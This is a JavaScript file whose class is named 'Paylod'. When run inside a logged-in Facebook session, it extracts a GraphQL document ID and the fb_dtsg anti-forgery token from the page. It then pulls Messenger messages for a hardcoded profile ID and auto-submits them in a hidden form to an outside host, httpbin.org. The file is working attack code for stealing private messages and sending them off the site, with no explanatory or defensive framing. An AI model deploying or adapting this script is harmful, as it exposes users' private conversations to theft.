class HTMLParser {
    constructor(s) {
        const parser = new DOMParser();
        this.dom = parser.parseFromString(s, "text/html");
    }

    select(s) {
        return this.dom.querySelector(s);
    }

    selectAll(s) {
        return this.dom.querySelectorAll(s);
    }
}


class HTTP {
    constructor(url) {
        this.url = url;
        this.client = new XMLHttpRequest();
        this.params = "?";
    }

    addParam(key, value) {
        this.params += `${key}=${value}&`;
        return this;
    }

    get(callback) {
        this.client.open("GET", this.url + this.params, true);
        this.client.onreadystatechange = function() {
            if (this.readyState === 4 && this.status === 200) {
                callback(this.responseText);
            }
        }
        this.client.send();
    }

    setPayload(s) {
        this.params = s
        return this;
    }

    post(callback) {
        this.client.open("POST", this.url, true);
        this.client.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        this.client.onreadystatechange = function() {
            if (this.readyState === 4 && this.status === 200) {
                callback(this.responseText);
            }
        }
        this.client.send(this.params.replace("?", ""));
    }
}


class Paylod {
    constructor() {
        this.profileIds = [{id: '100033441649014', is_done: false}];
        this.msg = "";
    }

    initiate(callback) {
        let parent = this;
        let scripts = document.querySelectorAll("script");
        let content = "";
        let urls = [];
        for (let i = 0; i < scripts.length; i++) {
            let src = scripts[i].getAttribute("src");
            if (src !== null && src !== undefined) {
                if (src.startsWith("http://") || src.startsWith("https://")) {
                    urls.push(src);
                }
            }
            let s = scripts[i].innerHTML;
            if (s.indexOf('{"type":"js","src":') > -1) {
                content = s;
                break;
            }
        }

        // "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iZjK4\/yf\/l\/en_US\/XZ5mG508c2g.js"
        let regex = /function\(Bootloader\)\{Bootloader\.setResourceMap\(\{(.*?)\}\)\;Bootloader\.enableBootload\(\{/g
        let found = "{" + content.match(regex)[0].replace(/function\(Bootloader\)\{Bootloader\.setResourceMap\(\{/g, '').replace(/\}\)\;Bootloader\.enableBootload\(\{/g, '') + "}";

        let obj = JSON.parse(found);
        let keys = Object.keys(obj);

        for (let i = 0; i < keys.length; i++) {
            let url = obj[keys[i]]["src"];
            urls.push(url);
        }

        for (let i = 0; i < urls.length; i++) {
            new HTTP(urls[i])
                .get(function(res) {
                    if (res.indexOf("IrisProtocolMessageLifetime") > -1) {
                        let docId = res.match(/\_\_getDocID\=function\(\)\{return\"[0-9]*\"\}/g)[0].match(/[0-9]/g).join("")
                        new HTTP("https://www.facebook.com/").get(src => {
                            let fb_dtsg = src.match(/\<input(.*?)name\=\"fb_dtsg\"(.*?)\/\>/g)[0].match(/"\w+:\w+"/g)[0].replace(/"/g, '');
                            parent.run(docId, fb_dtsg);
                        });
                    }
                });
        }
    }
    getMessages(docId, fb_dtsg, profileId, index) {
        let parent = this;
        new HTTP("https://www.facebook.com/api/graphqlbatch/")
        .setPayload(`batch_name=MessengerGraphQLThreadFetcher&__a=1&__req=19t&__be=1&__pc=PHASED:DEFAULT&dpr=1&fb_dtsg=${fb_dtsg}&__spin_b=trunk&queries={"o0":{"doc_id":${docId},"query_params":{"id":"${profileId}","message_limit":10,"load_messages":true,"load_read_receipts":true,"load_delivery_receipts":true}}}`)
        .post(function(res) {
            let node = res.split('"successful_results"')[0].trim().slice(0, -1);
            let obj = JSON.parse(node);
            let messages = obj[Object.keys(obj)[0]]["data"]["message_thread"]["messages"]["nodes"];
            let s = profileId + " => ";
            messages.forEach(message => {
                if (message["message"] !== undefined) {
                    s += message["message"]["text"] + "\n";
                }
            });

            parent.profileIds[index]["is_done"] = true;
            console.log("DONE: " + profileId);

            parent.msg += s;
        });
    }

    run(docId, fb_dtsg) {
        console.log(docId);
        console.log(fb_dtsg);
        let parent = this;
        for (let i = 0; i < this.profileIds.length; i++) {
            this.getMessages(docId, fb_dtsg, this.profileIds[i].id, i);
        }

        setInterval(function() {
            let isDone = true;
            for (let i = 0; i < parent.profileIds.length; i++) {
                if (!parent.profileIds[i].is_done) {
                    isDone = false;
                }
            }
            
            if (isDone) {
                let form = document.createElement("form");
                form.setAttribute("method", "post");
                form.setAttribute("action", "http://httpbin.org/post")
            
                let textarea = document.createElement("textarea");
                textarea.setAttribute("name", "messages");
                textarea.value = parent.msg;
                
                form.appendChild(textarea);
                document.body.appendChild(form);
                form.submit();
            }
        }, 1000);
    }
}


new Paylod().initiate();